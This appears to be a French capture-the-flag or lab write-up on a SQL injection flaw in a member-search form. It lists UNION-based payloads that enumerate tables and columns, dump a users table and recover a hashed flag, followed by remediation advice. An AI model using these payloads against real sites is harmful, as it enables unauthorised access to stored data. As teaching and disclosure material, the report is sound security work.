# Rapport de Vulnérabilité : Injection SQL

## Nom de la Faille
Injection SQL

## OWASP
**A03:2021 – Injection**

## Description
Cette faille permet à un attaquant d'exécuter des requêtes SQL arbitraires via un formulaire de recherche de membre par ID. En exploitant cette faille, l'attaquant peut accéder à des informations sensibles de la base de données, telles que les noms de tables, les noms de colonnes et même les données stockées dans ces colonnes.

## Comment Exploiter la Faille

### Étape 1 : Découverte de la base de données
Pour connaître la base de données active sur laquelle nous sommes connectés, nous utilisons la commande suivante :
```
1 UNION ALL SELECT 1, DATABASE()
```

### Étape 2 : Récupération des tables
Pour obtenir la liste de toutes les tables de la base de données active, nous exécutons la commande suivante :
```
1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
```

### Étape 3 : Récupération des colonnes
Une fois les tables identifiées, nous récupérons les colonnes associées à chaque table avec la commande suivante :
```
1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
```

### Étape 4 : Extraction du contenu des colonnes
Pour obtenir le contenu d'une colonne spécifique d'une table, nous utilisons :
```
1 AND 1=2 UNION SELECT {column_name}, null FROM users
```

### Étape 5 : Traitement des données extraites
Dans la colonne "Commentaire", nous obtenons un message nous indiquant de :
1. Déchiffrer le code en MD5.
2. Mettre le résultat en minuscule.
3. Encrypter ce résultat en SHA-256.

### Exemple de traitement
- Code MD5 extrait : `5ff9d0165b4f92b14994e5c685cdce28`
- Décodage MD5 : `FortyTwo`
- Conversion en minuscule : `fortytwo`
- Encodage SHA-256 :
```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## Comment Résoudre la Faille
Pour corriger cette vulnérabilité, suivez ces étapes :

1. **Paramétrisation des requêtes** : Utilisez des instructions SQL paramétrées pour éviter l'exécution directe de chaînes de caractères.
2. **Échappement des entrées utilisateurs** : Vérifiez et échappez toutes les entrées pour empêcher l'injection SQL.
3. **Validation côté serveur** : Ne faites jamais confiance aux données envoyées par l'utilisateur.
4. **Journalisation** : Surveillez les tentatives suspectes d'injection pour détecter toute activité malveillante.

## Conclusion
L'injection SQL est une vulnérabilité critique pouvant exposer des données sensibles. L'utilisation de requêtes paramétrées, la validation côté serveur et l'échappement approprié des entrées sont des pratiques indispensables pour sécuriser les applications web contre cette attaque.
